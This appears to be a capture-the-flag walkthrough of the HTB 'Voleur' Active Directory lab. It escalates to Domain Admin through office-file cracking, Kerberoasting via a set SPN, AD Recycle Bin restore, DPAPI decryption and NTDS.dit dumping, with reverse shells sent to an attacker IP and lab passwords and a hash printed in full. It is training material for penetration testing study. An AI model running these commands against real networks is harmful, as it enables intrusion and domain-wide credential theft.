---
title: "HTB Voleur"
date: 2026-05-14 06:37 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, SMB, DPAPI]
image: /assets/img/posts/voleur/voleur.png
---
**HTB Voleur** is an assume-breach Windows `Active Directory` machine that starts with provided low-privileged credentials and escalates through `SMB` enumeration, cracked office documents, `Kerberoasting`, `AD Recycle Bin` abuse, `DPAPI` credential decryption, and `NTDS.dit` extraction to obtain full `Domain Administrator` access.

## Machine Information
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account:
```
ryan.naylor
```
```
HollowOct31Nyt
```
## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.232.130 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2222/tcp  open  EtherNetIP-1
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
54739/tcp open  unknown
54741/tcp open  unknown
54767/tcp open  unknown
65228/tcp open  unknown
```
- NSE Scripts & Version
```
nmap -sCV -p53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49668,54739,54741,54767,65228 10.129.232.130 -nv --min-rate 1000
```
```
PORT      STATE SERVICE       VERSION                                                                                                                        
53/tcp    open  domain        Simple DNS Plus                                                                                                                
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 14:22:52Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)                                    
445/tcp   open  microsoft-ds?                                                                                                                                
464/tcp   open  kpasswd5?                                                                                                                                    
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                            
636/tcp   open  tcpwrapped                                                                                                                                   
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                                                                  
| ssh-hostkey:                                                                                                                                               
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)                                                                                               
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)                                                                                              
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)                                                                                            
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
54739/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54741/tcp open  msrpc         Microsoft Windows RPC
54767/tcp open  msrpc         Microsoft Windows RPC
65228/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-14T14:23:45
|_  start_date: N/A
|_clock-skew: 7h59m57s
```
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.232.130 --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb DC.voleur.htb --generate-krb5-file /etc/krb5.conf
```
- time
```
sudo ntpdate -u DC.voleur.htb
```
### Enumeration
- SMB

```
➜  Voleur nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

- SHARES

```
➜  Voleur nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
SMB         DC.voleur.htb   445    DC               -----           -----------     ------
SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
SMB         DC.voleur.htb   445    DC               C$                              Default share
SMB         DC.voleur.htb   445    DC               Finance                         
SMB         DC.voleur.htb   445    DC               HR                              
SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
SMB         DC.voleur.htb   445    DC               IT              READ            
SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share 
SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share
```
> IT: READ

```
nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_FILTER='print$,ipc$,netlogon,sysvol'
```
```json
{
  "IT": {
    "First-Line Support/Access_Review.xlsx": {
      "atime_epoch": "2025-01-31 04:09:27",
      "ctime_epoch": "2025-01-29 04:39:51",
      "mtime_epoch": "2025-05-29 18:23:36",
      "size": "16.5 KB"
    }
  }
}
```
### FIRST-LINE
```
➜  Voleur office2john Access_Review.xlsx > hash.txt
➜  Voleur john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
football1        (Access_Review.xlsx)
```

| User | Job Title | Permissions | Notes |
|---|---|---|---|
| Ryan.Naylor | First-Line Support Technician | SMB | Has Kerberos Pre-Auth disabled temporarily to test legacy systems. |
| Marie.Bryant | First-Line Support Technician | SMB |  |
| Lacey.Miller | Second-Line Support Technician | Remote Management Users |  |
| Todd.Wolfe | Second-Line Support Technician | Remote Management Users | Leaver. Password was reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs | Third-Line Support Technician | Remote Management Users | Has access to Software folder. |
| Administrator | Administrator | Domain Admin | Not to be used for daily tasks! |

| Service Account | Purpose | Credentials / Notes | Notes |
|---|---|---|---|
| svc_backup | Windows Backup | Speak to Jeremy! |  |
| svc_ldap | LDAP Services | P/W - M1XyC9pW7qT5Vn |  |
| svc_iis | IIS Administration | P/W - N5pYxW1VqM7CZ8 |  |
| svc_winrm | Remote Management | Need to ask Lacey as she reset this recently. |  |

| Account | Credentials |
|---|---|
| svc_ldap | P/W - M1XyC9pW7qT5Vn |
| svc_iis | P/W - N5pYxW1VqM7CZ8 |
| Todd.Wolfe | Password was reset to NightT1meP1dg3on14 |

## Rusthound

```
➜  Voleur nxc ldap DC.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k 
LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
```
### Collect
```
rusthound-ce --domain voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -z
```
### ldap_svc ➜ winrm_svc ➜ (Restore Todd.Wolfe)
![blood1](/assets/img/posts/voleur/blood1.png)
```
bloodyAD -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d voleur.htb --host DC.voleur.htb -k set object 'svc_winrm' servicePrincipalName -v 'HTTP/Pwned'
```
```
nxc ldap DC.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k --kerberoast -
```
```
svc_winrm:AFireInsidedeOzarctica980219afi
```
- Shell as svc_winrm

```
nxc smb DC.voleur.htb -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -k --generate-tgt svc_winrm
```
```
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i DC.voleur.htb -r voleur.htb
```
- Shell as svc_ldap [RunasCs](https://github.com/antonioCoco/RunasCs)

```
rlwrap -cAr nc -lvnp 8118
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.141:8118
```
- Restore `Todd.Wolfe`

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```
```
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```
```
nxc smb DC.voleur.htb -u 'Todd.Wolfe' -p 'NightT1meP1dg3on14' -k     
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\Todd.Wolfe:NightT1meP1dg3on14
```
### SECOND-LINE
```
rlwrap -cAr nc -lvnp 8228
.\RunasCs.exe Todd.Wolfe NightT1meP1dg3on14 powershell.exe -r 10.10.14.141:8228
```
```
Compress-Archive -Path '.\AppData\' -DestinationPath C:\ProgramData\AppData.zip
```

## DPAPI
### Credential
```
impacket-smbclient -k 'voleur.htb/Todd.Wolfe:NightT1meP1dg3on14@DC.voleur.htb'
```
- Credentiel

```
# cd AppData\Roaming\Microsoft\Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
```
- Master Key

```
# cd AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 08:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 07:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```
- Decrypt Master Key

```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

- Recover Credential

```
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```
### THIRD-LINE
```
jeremy.combs:qT3V9pLXyN7W4m
```
![blood2](/assets/img/posts/voleur/blood2.png)
## Shell
### Shell as jeremy
```
➜  Voleur nxc smb DC.voleur.htb -u 'jeremy.combs' -p 'qT3V9pLXyN7W4m' -k
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m
```
``` 
➜  Voleur kinit jeremy.combs
Password for jeremy.combs@VOLEUR.HTB: 
➜  Voleur klist             
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: jeremy.combs@VOLEUR.HTB
Valid starting       Expires              Service principal
05/14/2026 12:46:58  05/14/2026 22:46:58  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 05/15/2026 12:46:49
```
```
➜  Voleur evil-winrm -i DC.voleur.htb -r voleur.htb
```
```
*Evil-WinRM* PS C:\IT\Third-Line Support> dir
d-----         1/30/2025   8:11 AM                Backups !#PermissionDenied#!
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt
```
### shell as svc_backup (WSL)
```
➜  Voleur chmod 600 id_rsa 
➜  Voleur ssh-keygen -y -f id_rsa 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC
```
```
ssh -p 2222 svc_backup@DC.voleur.htb -i id_rsa
```
```
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ 
```
### secretsdump (NTDS)
```
scp -P 2222 -i id_rsa svc_backup@DC.voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit' .
scp -P 2222 -i id_rsa svc_backup@DC.voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM' .
scp -P 2222 -i id_rsa svc_backup@DC.voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY' .
```
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```
### shell as Administrator
```
➜  Voleur nxc smb DC.voleur.htb -u 'Administrator' -H 'e656e07c56d831611b577b160b259ad2' -k
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\Administrator:e656e07c56d831611b577b160b259ad2 (Pwn3d!)
```


